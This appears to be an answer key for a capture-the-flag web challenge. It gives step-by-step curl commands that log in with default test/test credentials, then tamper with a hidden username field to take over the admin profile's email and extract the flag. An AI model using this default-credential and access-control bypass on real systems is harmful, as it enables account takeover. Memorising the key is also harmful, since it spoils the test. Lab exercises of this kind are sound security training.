# EXACT SOLUTION — FOLLOW THESE STEPS IN ORDER

Vulnerability: IDOR / broken access control + default creds. The `/profile` POST
updates the email of whichever `username` is submitted (a client-controlled hidden
field), not the session user. Submitting `username=admin` triggers the flag
message. Default account: `test`/`test`.

1. **Log in** with `test`/`test`:

   ```
   curl -s -c cookies.txt -d "username=test&password=test" "http://<target>/login" -L -o /dev/null
   ```

2. **POST the profile update overriding `username=admin`:**

   ```
   curl -s -b cookies.txt -c cookies.txt -X POST "http://<target>/profile" \
     -d "email=pwned@evil.com&username=admin"
   ```

3. **Extract the flag** (`FLAG{...}`) from the response (shown when
   `username==admin`) and report it verbatim.
